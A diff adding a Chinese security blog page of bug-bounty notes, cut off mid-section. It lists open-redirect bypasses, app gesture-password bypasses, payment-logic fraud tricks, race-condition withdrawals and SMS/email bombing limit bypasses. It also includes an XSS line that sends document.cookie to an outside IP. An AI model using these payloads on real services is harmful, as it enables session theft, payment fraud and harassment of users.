@@ -1,0 +1,1307 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="url跳转漏洞0x01   利用问号绕过限制 http://www.aaa.com/acb?Url=http://test.com?login.aaa.com 0x02  利用反斜杠和正斜杠绕过限制 http://www.aaa.com/acb?Url=http://test.com/login.aaa.com http://www.aaa.com/acb?Url=http://test.com\">
+<meta name="keywords" content="src">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SRC挖掘">
+<meta property="og:url" content="https://wh0ale.github.io/2019/02/21/2019-2-21-src挖掘/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="url跳转漏洞0x01   利用问号绕过限制 http://www.aaa.com/acb?Url=http://test.com?login.aaa.com 0x02  利用反斜杠和正斜杠绕过限制 http://www.aaa.com/acb?Url=http://test.com/login.aaa.com http://www.aaa.com/acb?Url=http://test.com\">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f5mc6o9yj20fm0bcjtd.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f5mgw3ndj20ip08sdj2.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f5mku4vpj20j607xwhg.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f5oq22ryj20ee0eqwhz.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f5ouf52pj20j608ajuc.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f5r9jxbvj20j609utcs.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f5t7ju6jj20gb0820v0.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f4h3uaysj20ru0ciwh0.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f4lvf7e8j20j607mq7k.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f4m275y4j20j604340r.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f4t3bbntj20j6062dhx.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f615wzflj20j60jwjxt.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f61esiy5j20ii0aln1d.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f6aaqybfj20j607ago6.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f6apmn2rj20j606bwgj.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f6eb1sqpj20cp07bab2.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f6f9qwlbj20er06v3zg.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f6xoq8ojj20j609l77i.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f6xz4zvdj20j609kadm.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f6ykpps1j20cp07bab2.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f70ssrlhj20ie0ht0vp.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f714ozx2j20j60d00wz.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f72ypkiaj207c02waal.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f73oo5izj20j60agn03.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f76bq1j4j20gh05sgnj.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f75x11rlj20ge05jtbh.jpg">
+<meta property="og:updated_time" content="2019-12-03T06:07:12.732Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SRC挖掘">
+<meta name="twitter:description" content="url跳转漏洞0x01   利用问号绕过限制 http://www.aaa.com/acb?Url=http://test.com?login.aaa.com 0x02  利用反斜杠和正斜杠绕过限制 http://www.aaa.com/acb?Url=http://test.com/login.aaa.com http://www.aaa.com/acb?Url=http://test.com\">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f5mc6o9yj20fm0bcjtd.jpg">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/02/21/2019-2-21-src挖掘/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>SRC挖掘 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/02/21/2019-2-21-src挖掘/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">SRC挖掘
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-02-21 00:00:00" itemprop="dateCreated datePublished" datetime="2019-02-21T00:00:00+08:00">2019-02-21</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-12-03 14:07:12" itemprop="dateModified" datetime="2019-12-03T14:07:12+08:00">2019-12-03</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">20k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">18 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="url跳转漏洞"><a href="#url跳转漏洞" class="headerlink" title="url跳转漏洞"></a>url跳转漏洞</h1><p><strong>0x01   利用问号绕过限制</strong></p>
+<p><a href="http://www.aaa.com/acb?Url=http://test.com?login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.com?login.aaa.com</a></p>
+<p><strong>0x02  利用反斜杠和正斜杠绕过限制</strong></p>
+<p><a href="http://www.aaa.com/acb?Url=http://test.com/login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.com/login.aaa.com</a></p>
+<p><a href="http://www.aaa.com/acb?Url=http://test.com\\login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.com\\login.aaa.com</a></p>
+<p><a href="http://www.aaa.com/acb?Url=http://test.com\login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.com\login.aaa.com</a></p>
+<p><a href="http://www.aaa.com/acb?Url=http://test.com\.login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.com\.login.aaa.com</a></p>
+<p><strong>0x03  利用@绕过URL限制</strong></p>
+<p><a href="http://www.aaa.com/acb?Url=http://login.aaa.com@test.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://login.aaa.com@test.com</a></p>
+<p><strong>0x04  利用白名单缺陷绕过限制</strong></p>
+<p>直接注册一个testaaa.com这个域名就可以利用这个跳转</p>
+<p><strong>0x05  多重验证&amp;跳转绕过限制</strong></p>
+<p><a href="http://www.aaa.com/acb?Url=http://login.aaa.com/acb?url=http://login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://login.aaa.com/acb?url=http://login.aaa.com</a></p>
+<p><strong>0x06  点击触发达到绕过URL跳转限制</strong></p>
+<p><a href="http://www.aaa.com/acb?Url=http://test.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.com</a></p>
+<p><strong>0x07  利用xip.io绕过</strong></p>
+<p><a href="http://www.qq.com.220.181.57.217.xip.io" target="_blank" rel="noopener">http://www.qq.com.220.181.57.217.xip.io</a>  当你访问qq这个域名时，其实这个链接已经被解析到后面这个ip地址上了，那么实际访问的就是后面这个IP地址</p>
+<p><strong>0x08  利用超链接绕过可信站点限制</strong></p>
+<p>302跳转，百度收录的网站都可以跳转</p>
+<p><strong>0x09  POST参数中的URL跳转</strong></p>
+<p>上传图片的时候修改图片url，可以改成xss &lt;img src=x onerror=window.open(<code>http://134.175.33.164:1234/?${document.cookie}</code>)&gt;</p>
+<p><strong>0x10  利用#号绕过</strong></p>
+<p><a href="http://www.aaa.com/acb?Url=http://test.com#login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.com#login.aaa.com</a></p>
+<p>当你输入账号和密码后点击登陆按钮后，就会触发跳转</p>
+<h1 id="APP手势密码绕过思路总结"><a href="#APP手势密码绕过思路总结" class="headerlink" title="APP手势密码绕过思路总结"></a>APP手势密码绕过思路总结</h1><p><strong>0x01   利用APP广告绕过</strong></p>
+<p>加载广告返回一下，可能回绕过手势密码</p>
+<p><strong>0x02   利用多重启动绕过</strong></p>
+<p>正常启动，需要手势密码，然而重新在应用商店再打开APP如果验证不当，可以导致直接绕过手势密码</p>
+<p><strong>0x03   利用退出绕过&amp;爆破</strong></p>
+<p>限制错误次数为5次，而这时这个超过次数的信息可能会弹出框来提醒，这时候不要点击，清理后台的APP，重新打开APP，如果验证没做好的话，又有5次寄回输入手势密码</p>
+<p><strong>0x04   利用清理不当绕过</strong></p>
+<p>手势密码 -&gt; 本地信息，登录信息 -&gt; 数据库信息。清理掉文本信息，就是清楚了手势密码，登录状态保持，可以绕过。</p>
+<p><strong>0x05   利用显示不当绕过</strong></p>
+<p>一些APP当你启动APP的时候，它会在短时间内进入到或者说可以点击到APP内的某些功能，此时你只要一直点击这个页面，只要够快，就可以绕过手势密码，达到这个功能界面。</p>
+<p><strong>0x06   利用APP自带提示绕过</strong></p>
+<p>一些APP会自带提示，比如在状态栏内是不是推送一些信息，如果验证不当，就可以直接绕过手势密码，直接进入到主页面。</p>
+<p><strong>0x07   利用快捷发送绕过</strong></p>
+<p>这个我从来就没遇到过，APP手势密码验证界面会出现设置按钮，直接设置没有加以验证从而绕过。</p>
+<p><strong>0x08   利用清理缺陷绕过</strong></p>
+<p>跟刚刚那个说的很像，也是手势密码跟账户信息储存在不同处，而追后只清理掉手势密码没清理掉登录信息的问题，在需要手势密码验证的界面点击忘记手势密码，此时会跳转到登录界面，直接返回到桌面，清理掉后台运行的APP，再次打开就直接进入到主界面，并且是登录状态。</p>
+<p><strong>0x09   利用界面设计缺陷绕过</strong></p>
+<p>以前看到过相关问题，问题是出现在IOS下的，所以我就列出来了，当进入到手势密码界面，可以左右滑动，从而滑动到主页面，绕过手势密码，这个问题可能已经很少软件存在了。</p>
+<p><strong>需要root还有越狱</strong></p>
+<p><strong>0x01   利用拒绝服务绕过</strong></p>
+<p>通过分析APP，找到跟手势密码相关的组件，当这个Activity停止后，就会跳转到下个Activity，而下个Activity就是主页面，从而绕过了手势密码。</p>
+<p><strong>0x02   修改shared_prefs目录下的文件从而绕过的思路总结</strong></p>
+<p>在这个文件夹查看xml文件，修改文件密码，根据文件时间确认改动的是哪个文件</p>
+<p>找到存储手势密码的文件后</p>
+<p>① 可以取消文件的所有权限，让他不加载手势密码</p>
+<p>② 查看文件内容，在文件内查找手势密码，看手势密码是否加密。可以清除参数</p>
+<p>③ 修改目录权限</p>
+<p><strong>0x03   修改databases目录下的文件从而达到绕过</strong></p>
+<p>你可以修改权限，具体是修改哪里的权限我忘记了，好像是修改这个数据库文件的权限，或者数据库目录权限，把执行权限都勾上，具体请自己去测试下。</p>
+<p>也可以直接把这个数据库地址复制到本地目录也就是sdcard目录下，就可以正常打开，因为权限允许，然后修改后再覆盖回去，再修改好相关权限即可。</p>
+<p>第一种思路：修改数据库文件内容</p>
+<p>第二种思路：修改数据库文件权限</p>
+<p>第三种思路：修改数据库目录权限</p>
+<p><strong>0x04   修改files目录的文件从而达到绕过</strong></p>
+<p>有些目录时间跟你修改时间不同步但是其目录里的文件是同步了的，比较隐蔽，比如你修改了手势密码，根据修改时间找相关的目录以及文件，但是一些目录它时间还是以前的时间，不细心的可能就会直接不看，但是我都会去看的，然后里面的文件最近修改时间就是我刚修改手势密码的时间，所以细心很重要，如果不注意这个问题，你可能就找不当这个问题的存在或者需要花费很久的时间才能找到了。</p>
+<p>最新思路：禁用权限再开启权限绕过</p>
+<p>最新思路：禁用权限再开启权限绕过</p>
+<h1 id="支付漏洞之总结"><a href="#支付漏洞之总结" class="headerlink" title="支付漏洞之总结"></a>支付漏洞之总结</h1><p><strong>0x01   修改支付价格</strong></p>
+<p>付款时进行抓包尝试修改金额，如果没有在最后一步做好检验，那么问题就会存在，其修改的金额值你可以尝试小数目或者尝试负数。</p>
+<p><strong>0x02   修改支付状态</strong></p>
+<p>这个问题是没有对支付状态的值跟实际订单支付状态进行校验，导致点击支付时抓包修改决定支付或未支付的参数为支付状态的值从而达到支付成功。</p>
+<p><strong>0x03   修改购买数量</strong></p>
+<p>在支付的过程中，数量也同时决定着价格，比如：1个数量商品对应的是100，2个数据就是200，那么当你修改这个值数量值为负数时，那么其金额也会变为负数，最后就会导致支付问题的产生。</p>
+<p><strong>0x04   修改附属值</strong></p>
+<p>①：修改优惠劵金额</p>
+<p>②：修改优惠劵金额及业务逻辑问题</p>
+<p>第一步没成功的情况下，返回个人中心，验证不严谨的话，可以在订单想请看到支付金额为0.这时候点击支付即可支付成功。</p>
+<p>③：修改积分金额</p>
+<p>有些网站有积分，比如你消费多少，评论多少就可以拥有一定的积分数量，这个积分可以在你付款的时候进行折扣其订单金额，如果这个没有做好积分金额的校验，那么当你在支付当中选择用积分为账户减一些金额的时候，可以抓包修改其积分金额为任意数或负金额，然后可0元支付成功</p>
+<p><strong>0x05   修改支付接口</strong></p>
+<p>比如一些网站支持很多种支付，比如自家的支付工具，第三方的支付工具，然后每个支付接口值不一样，如果逻辑设计不当，当我随便选择一个点击支付时进行抓包，然后修改其支付接口为一个不存在的接口，如果没做好不存在接口相关处理，那么此时就会支付成功。</p>
+<p><strong>0x06   多重替换支付</strong></p>
+<p>以前好像也看到过相关的例子，首先去产生两个订单，这两个订单商品是不一样的，其价格不一样，如果服务端没有做好这相关的验证，那么在支付的过程当中抓包，修改其订单值为另一个订单值，最后支付，这时就可以用订单一的支付价格买到订单而的商品。</p>
+<p><strong>0x07   重复支付</strong></p>
+<p>这个其实只是支付当中的一个别类，但是这个思路新颖，所以我就列了出来，比如一些交易市场有一类似于试用牌子或者其它，这个试用牌子可以依靠签到获得，而这个牌子的作用可以去试用一些商品，在你进行试用的时候会扣掉你的试用牌子，当你试用完成或者主动取消试用时，试用牌子会返回到账户当中，你知道，签到得到的牌子肯定很少，且如果想试用好一点的商品那么牌子的数量就尤为重要了。</p>
+<p>这里的问题就是如果没有进行对订单多重提交的校验，那么就可导致无限制刷牌子，比如，你试用时抓包，然后你每次试用都会产生一个订单号，然后利用刚抓到的数据包进行批量提交，你就可以看到每次提交的订单号不一样，然后这时你再看订单可以看到同一个商品的无数订单，但试用牌子数只扣了你第一个试验时的牌子数，那么这时你申请批量退出试用，那么这么多订单，每退一个就会退相应的牌子数量到账户当中，这就构成了无限制刷得问题。</p>
+<p><strong>0x08   最小额支付</strong></p>
+<p>在很多白帽子测试支付的漏洞时候，修改的金额往往都是0.01等或者负数，我想说这很容易错失掉一些潜在的支付问题，我就深有体会，在挖掘支付漏洞的过程当中，就遇到过，直到第三次再一次检测时才发现，比如一些网站有金币或者积分什么就相当于支付可以用这些支付，那么在充值的时候，比如：10元对应的积分值为100、50对应的是5000、100对应的是10000。</p>
+<p>这个问题如果你在充值时进行修改其支付金额为负数或者0.01等是会显示支付失败的，但是如果你修改其金额为1.00，那么支付就会成功，也就用1元购买到任意值得积分数量了，这是为什么呢？</p>
+<p>其实你在测试过程当中细心点就可以很好发现的，这里最低就是1元，1元对应100积分，而你如果修改为0.01，那么对应的积分就是空值了，所以会显示失败，而当你修改为1元，那么1元这个支付接口是存在的，其后面积分数为其它金额的积分数，然后跳转过去支付就会以1元购买到比它多得多的积分数量，也可以是任意积分值。</p>
+<p><strong>0x09   值为最大值支付问题</strong></p>
+<p>以前也是看到过相关的例子，一些网站比如你购买商品，这里有2个思路修改值，1是直接修改支付金额值为最大值，比如999999999，或者修改附属值，如优惠卷，积分等为999999999，如果这里逻辑设计有问题，那么其支付金额会变为0。</p>
+<p><strong>0x10   越权支付</strong></p>
+<p>这个问题很早之前有过，现在可能很少存在这类问题，在支付当中会出现当前用户的ID，比如：username=XXXXX，如果没有加以验证，其支付也是一次性支付没有要求输入密码什么的机制，那么就可以修改这个用户ID为其它用户ID，达到用其他用户的账号进行支付你的商品。</p>
+<p><strong>0x11   无限制试用</strong></p>
+<p>一些网站的一些商品，比如云系列产品支持试用，试用时期一般为7天或者30天，一个账户只能试用一次，试用期间不能再试用，但如果这个试用接口会做好分配那么很容易导致问题的发生。</p>
+<p>这也是我遇到过的例子，比如：在支付的时候它URL后面的支付接口是3，而试用接口是4，那么此时你已经使用过了，复制下确认试用时的URL，修改后面的支付接口为3，那么此时就会调用购买支付接口，但是由于你本身这个产品就是试用的，其相应值绑定了这个试用商品，那么金额就肯定是0，那么最后点击支付，你就可以看到支付成功，试用成功，又重复试用了一次，然后他们的试用时间会累加在一起，这就导致了可无限制购买任何产品了。</p>
+<p><strong>0x12   修改优惠价</strong></p>
+<p>比如一些商品有优惠价，优惠多少多少，那么在支付时抓包，修改这个优惠价就可造成支付问题的产生。</p>
+<p>以下是不常见思路</p>
+<p> <strong>0x01   多线程并发问题</strong></p>
+<p>可能很多白帽子知道，也有可能不知道，或者听说过，但是没有实际挖掘过，那么我相信，这个思路会让你们有新的挖掘方向了。</p>
+<p>现在可能还有一些大厂商存在该问题，多线程并发问题就是没有实时的处理各种状态所导致的问题，之前挖掘过刷钱问题，就是利用该思路，比如很多平台有自家的钱包，而这个钱包是一个迷你钱包，这个钱包作用也仅是用于这当前一个业务平台网站，在提现时，没有任何验证码或者校验机制，只要输入体现金额就可以提现，并且是秒到账，如果什么负数，修改金额都测试过了都不行，那么你就可以试试多线程并发问题，提现时抓包，比如我现在钱包内有0.1元，那么按理说每提0.01可以体现10次，也就是发送10次进程，但是利用这个问题可以达到多发现几次成功的进程，提现时抓包，然后把数据包发送到BurpSuite工具的Intruder当中，进行批量发送18次，然后可以看到成功的提现到了12次。</p>
+<p>这里我贴出相关证明图片：</p>
+<p>这里是从0开始到11截止，我账户内只有0.1 而这里体现了0.12 也就是提现的进程为12次，369为提现成功，349为提现失败的长度值，从这里就可以看出这个问题的危害了，当然此时账户的金额肯定是为负的了，如果把这个提现金额变大，那么这多提现的金额可不是闹着玩的。</p>
+<p>当然，多线程也可以在其它功能处进行测试，比如我之前讲到的试用商品问题，就可以通过多线程进行多几次的使用，比如利用积分总换礼品，一个账户只能进行总换一次，利用这个问题，可以多几次总换，一些转账功能，提现功能，购买功能等等很多。</p>
+<p><strong>0x02   支付问题挖掘技巧</strong></p>
+<p>如果你习惯用BurpSuite工具，那么在你测试抓包的时候通常请求包都有很多，比如有3个请求包，第一个请求包是一个干扰数据包，第二个是一个图片加载的数据包，第三个可能才是支付相关的数据包，所以有时候要细心，不要认为抓不到，如果你用的是其它工具，那么可以查看整个提交过程，所以很容易看到提交的各种数据包，在BurpSuite当中你可以通过Target这模块进行分析，这个模块会有你测试时相关的数据包。</p>
+<h1 id="绕过限制下的短信-amp-邮箱轰炸"><a href="#绕过限制下的短信-amp-邮箱轰炸" class="headerlink" title="绕过限制下的短信&amp;邮箱轰炸"></a>绕过限制下的短信&amp;邮箱轰炸</h1><p>绕过短信&amp;邮箱轰炸限制以及后续</p>
+<p>​        那么这些轰炸都存在在哪些方面呢？</p>
+<p>①：登录处</p>
+<p>②：注册处</p>
+<p>③：找回密码处</p>
+<p>④：绑定处</p>
+<p>⑤：活动领取处</p>
+<p>⑥：独特功能处</p>
+<p>⑦：反馈处</p>
+<p><strong>0x01   利用空格绕过短信&amp;邮箱轰炸限制</strong></p>
+<p>修改过的参数如：mobile1= XXXXXX ，在前面加上空格，每加一个空格就会有反复发送短信或邮件的机会。</p>
+<p><strong>0x02   利用调用接口绕过短信&amp;邮箱轰炸限制</strong></p>
+<p>比如这样的参数：terminal=01&amp;Mobile=XXXXXXX，前面的接口是调用短信发送内容的接口，比如terminal参数值为01是调用注册成功的短信提示，02是调用密码重置成功的短信提示，03是调用注册成功的短信提示等等，当修改这个接口值时，也就达到了短信轰炸或邮箱轰炸的目的。</p>
+<p><strong>0x03   修改Cookie值绕过短信&amp;邮箱轰炸限制</strong></p>
+<p>有些可能不是直接验证手机号来判断次数，而是验证当前Cookie，利用当前Cookie来进行验证发送次数的话，很容易造成绕过，这里如果验证的不是登录状态的Cookie而是普通状态下的Cookie的话就可以通过修改Cookie达到绕过验证。</p>
+<p>我找到了类似的例子：</p>
+<p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=27614" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=27614</a></p>
+<p><strong>0x04   修改IP绕过短信&amp;邮箱轰炸限制</strong></p>
+<p>有些同样是验证当前IP的，如果当前IP短时间内获取短信或邮件频繁或者达到一定次数的话就会出现限制，那么就可以利用修改IP或者代理IP来进行绕过限制。</p>
+<p> <strong>0x05   利用大小写绕过邮箱轰炸限制</strong></p>
